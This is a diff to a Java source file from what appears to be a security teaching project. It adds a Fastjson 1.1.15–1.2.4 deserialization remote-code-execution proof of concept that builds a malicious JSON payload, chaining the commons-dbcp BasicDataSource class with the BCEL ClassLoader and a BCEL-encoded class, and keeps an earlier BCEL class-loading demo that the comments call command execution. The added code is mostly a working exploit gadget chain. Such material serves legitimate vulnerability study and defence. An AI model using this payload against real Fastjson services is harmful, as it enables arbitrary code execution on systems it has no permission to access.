@@ -1,6 +1,16 @@
 package com.anbai.sec.classloader;
 
-import com.sun.org.apache.bcel.internal.classfile.Utility;
+import com.alibaba.fastjson.JSON;
+import com.alibaba.fastjson.JSONObject;
+import org.apache.bcel.classfile.Utility;
+import org.apache.bcel.util.ClassLoader;
+import org.apache.commons.dbcp.BasicDataSource;
+import org.javaweb.utils.FileUtils;
+
+import java.io.File;
+import java.io.IOException;
+import java.util.LinkedHashMap;
+import java.util.Map;
 
 public class BCELClassLoader {
 
@@ -69,27 +79,70 @@ public class BCELClassLoader {
 			11, 74, 7, 0, 23, -7, 0, 4, 0, 1, 0, 24, 0, 0, 0, 2, 0, 25
 	};
 
-	public static void main(String[] args) {
-		try {
-			// 使用反射是为了防止高版本JDK不存在com.sun.org.apache.bcel.internal.util.ClassLoader类
-			Class<?> bcelClass = Class.forName("com.sun.org.apache.bcel.internal.util.ClassLoader");
+	/**
+	 * 将一个Class文件编码成BCEL类
+	 *
+	 * @param classFile Class文件路径
+	 * @return 编码后的BCEL类
+	 * @throws IOException 文件读取异常
+	 */
+	public static String bcelEncode(File classFile) throws IOException {
+		return "$$BCEL$$" + Utility.encode(FileUtils.readFileToByteArray(classFile), true);
+	}
 
-			// 创建BCEL类加载器
+	/**
+	 * BCEL命令执行示例，测试时请注意兼容性问题：① 适用于BCEL 6.0以下。② JDK版本为：JDK1.5 - 1.7、JDK8 - JDK8u241、JDK9
+	 *
+	 * @throws Exception 类加载异常
+	 */
+	public static void bcelTest() throws Exception {
+		// 使用反射是为了防止高版本JDK不存在com.sun.org.apache.bcel.internal.util.ClassLoader类
+//		Class<?> bcelClass = Class.forName("com.sun.org.apache.bcel.internal.util.ClassLoader");
+
+		// 创建BCEL类加载器
 //			ClassLoader classLoader = (ClassLoader) bcelClass.newInstance();
 //			ClassLoader classLoader = new com.sun.org.apache.bcel.internal.util.ClassLoader();
-			ClassLoader classLoader = new org.apache.bcel.util.ClassLoader();
+		ClassLoader classLoader = new org.apache.bcel.util.ClassLoader();
 
-			// BCEL编码类字节码
-			String className = "$$BCEL$$" + Utility.encode(CLASS_BYTES, true);
+		// BCEL编码类字节码
+		String className = "$$BCEL$$" + Utility.encode(CLASS_BYTES, true);
 
-			System.out.println(className);
+		System.out.println(className);
 
-			Class<?> clazz = Class.forName(className, true, classLoader);
+		Class<?> clazz = Class.forName(className, true, classLoader);
 
-			System.out.println(clazz);
-		} catch (Exception e) {
-			e.printStackTrace();
-		}
+		System.out.println(clazz);
+	}
+
+	/**
+	 * Fastjson 1.1.15 - 1.2.4反序列化RCE示例，示例程序考虑到测试环境的兼容性，采用的都是Apache commons dbcp和bcel
+	 *
+	 * @throws IOException BCEL编码异常
+	 */
+	public static void fastjsonRCE() throws IOException {
+		// BCEL编码类字节码
+		String className = "$$BCEL$$" + Utility.encode(CLASS_BYTES, true);
+
+		// 构建恶意的JSON
+		Map<String, Object> dataMap        = new LinkedHashMap<String, Object>();
+		Map<String, Object> classLoaderMap = new LinkedHashMap<String, Object>();
+
+		dataMap.put("@type", BasicDataSource.class.getName());
+		dataMap.put("driverClassName", className);
+
+		classLoaderMap.put("@type", org.apache.bcel.util.ClassLoader.class.getName());
+		dataMap.put("driverClassLoader", classLoaderMap);
+
+		String json = JSON.toJSONString(dataMap);
+		System.out.println(json);
+
+		JSONObject jsonObject = JSON.parseObject(json);
+		System.out.println(jsonObject);
+	}
+
+	public static void main(String[] args) throws Exception {
+//		bcelTest();
+		fastjsonRCE();
 	}
 
 }
